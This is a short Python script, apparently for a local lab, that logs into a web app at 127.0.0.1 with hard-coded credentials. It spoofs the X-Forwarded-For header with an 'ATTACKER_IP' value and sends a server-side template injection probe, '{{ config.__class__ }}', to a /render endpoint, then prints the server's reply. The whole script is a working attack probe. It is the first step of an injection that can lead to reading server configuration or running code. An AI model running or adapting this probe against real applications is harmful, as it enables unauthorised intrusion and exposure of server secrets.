import requests

BASE_URL = "http://127.0.0.1:5004"

URL_LOGIN = f"{BASE_URL}/login"
URL_RENDER = f"{BASE_URL}/render"

USERNAME = "user1"
PASSWORD = "1234"
ATTACKER_IP = "10.15.15.18"

session = requests.Session()

headers = {
    "X-Forwarded-For": ATTACKER_IP
}

data_login = {
    "username": USERNAME,
    "password": PASSWORD
}

data_render = {
    "template": "{{ config.__class__ }}"
}

r_login = session.post(URL_LOGIN, data=data_login, headers=headers)

print("Login status:", r_login.status_code)


r_render = session.post(URL_RENDER, data=data_render, headers=headers)

print("Render status:", r_render.status_code)
print("Render response:", r_render.text)